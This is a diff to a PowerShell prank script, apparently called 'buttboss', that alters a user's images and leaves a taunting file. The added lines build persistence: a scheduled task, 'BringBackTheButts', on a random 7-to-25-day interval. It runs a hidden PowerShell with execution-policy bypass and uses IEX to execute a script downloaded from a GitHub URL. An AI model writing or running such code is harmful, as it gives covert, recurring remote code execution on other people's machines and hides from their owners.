@@ -89,10 +89,18 @@ foreach($imgUrlString in $listImgUrls)
 echo "Now who's boss." | Out-File -FilePath "C:\Goofin\buttbossin.txt" 
 notepad "C:\Goofin\buttbossin.txt"   
 
+
+# Ghost Protocols
+
 # Politeness Module
 # Reset the photots and icons after X minutes
 
-# Persistence Module
-# Schduled task for the script
-# Could we set it to choose a number between 7-20 = x and create a that runs every x days?
+# Persistence Module / Scheduled Task 
 # Could we trigger it off of a specific event number?
+# Get a random number between 1 week and 25 days to re-butt the system 
+$reseed = 7..25 | Get-Random
+[int]$reseed
+ $rebutt = New-ScheduledTaskAction -Execute "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://github.com/mellonaut/buttboss/buttboss.ps1'''))'"
+ $schedulebutts = New-ScheduledTasktrigger -Daily -DaysInterval $reseed -At 10am 
+ Register-ScheduledTask BringBackTheButts -Action $rebutt -Trigger $schedulebutts
+
